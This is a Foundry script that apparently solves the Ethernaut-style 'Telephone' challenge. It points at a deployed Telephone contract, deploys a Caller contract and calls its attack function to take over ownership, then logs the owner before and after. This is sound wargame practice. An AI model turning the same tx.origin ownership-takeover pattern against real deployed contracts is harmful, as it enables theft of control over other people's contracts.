// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Telephone, Caller} from "../src/Telephone.sol";

contract ForceSolution is Script {
    Telephone public telephone;
    Caller public caller;

    function run() external {
        vm.startBroadcast();// vm.envUint("PRIVATE_KEY") <= Faulty

        console.log("Solving Telephone...");
        // if (block.chainid == 11155111) {
        //     token = Token(0x60bF87c457fe67d023B6cE684B2e83B7b73dd5c8);
        // } else {
        //     token = new Token(20);
        // }
        // telephone = new Telephone();
        telephone = Telephone(0xE60C70f2Af3E00cC99A26C011EaA4D8fd592Ed20);
        caller = new Caller();
        console.log("owner: ", telephone.owner());
        caller.attack(address(telephone));
        console.log("owner: ", telephone.owner());
        vm.stopBroadcast();
        console.log("Telephone Solved!");
    }
}
